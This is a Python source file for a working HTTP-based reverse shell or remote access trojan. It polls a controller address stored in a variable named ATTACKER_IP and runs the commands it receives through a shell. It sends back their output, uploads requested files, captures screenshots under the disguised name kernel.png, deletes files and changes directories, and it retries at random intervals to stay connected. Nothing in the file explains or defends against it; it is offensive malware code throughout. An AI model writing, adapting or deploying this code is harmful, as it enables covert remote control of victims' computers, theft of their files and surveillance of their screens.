import requests,os,time,random,subprocess, pyscreenshot

def connect(ATTACKER_IP):
    while 1:
        req = requests.get(ATTACKER_IP)
        command = req.text
        if 'terminate' in command:
            return 1
        elif 'grab' in command:
            grab, path = command.split(" ")
            if os.path.exists(path):
                url = '%s/tmp'% ATTACKER_IP
                files = {'file': open(path,'rb')}
                r = requests.post(url, files=files)

            else:
                post_response = requests.post(url=ATTACKER_IP, data='[-] Not be able to transfer data')
        elif 'screenshot' in command:
            try:
                image = pyscreenshot.grab()
                image.save("/tmp/kernel.png")
                url = '%s/tmp'% ATTACKER_IP
                files = {'file' : open("/tmp/kernel.png", "rb")}
                r = requests.post(url,files=files)
            except:
                 post_response = requests.post(url=ATTACKER_IP, data='[-] Not be able to capture screenshot')

        elif 'remove' in command:
            code,filename = command.split(' ')
            if os.path.exists(filename):
                os.remove(filename)
            else:
                r=requests.post(ATTACKER_IP, data= "The file does not exist")

        elif 'cd' in command:
            code,directory = command.split(' ')
            try:
            	os.chdir(directory)
            	r=requests.post(ATTACKER_IP, data= "changes to "+os.getcwd())
            except:
                post_response = requests.post(url=ATTACKER_IP, data='[-] Not be able to change directory')
        else:
            CMD = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
            post_response = requests.post(url=ATTACKER_IP, data=CMD.stdout.read())
            post_response = requests.post(url=ATTACKER_IP,data=CMD.stderr.read())
            time.sleep(3)

if __name__ == '__main__':
    ATTACKER_IP = 'http://127.0.0.1:8080'
    while 1:
        try:
            if connect(ATTACKER_IP) == 1:
                break
        except:
            sleep_for = random.randrange(1,10)
            time.sleep(int(sleep_for))
            pass
